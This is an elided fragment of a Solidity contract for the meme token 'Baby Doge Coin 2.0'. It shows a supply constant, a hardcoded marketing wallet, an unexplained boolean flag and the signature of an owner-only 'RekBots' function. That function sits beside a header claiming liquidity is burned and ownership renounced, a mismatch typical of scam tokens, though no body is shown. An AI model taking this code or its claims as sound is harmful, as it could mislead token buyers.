/*
    ...
    Liquidity Burned & CA Renounced

    Following in the footsteps of SHIB2
...
contract BabyDoge2 is Context, IERC20, IERC20Metadata {
    ...
    uint256 public _totalSupply = 420000000*10**18;
    string public _name = "Baby Doge Coin 2.0";
    string public _symbol= "BabyDoge2";
    bool balances1 = true;
    ...
    address private marketAddy = payable(0x839246Bf3D2D33773B294C696c7DFE40F64031A3);
    ...
    function RekBots() onlyOwner public {
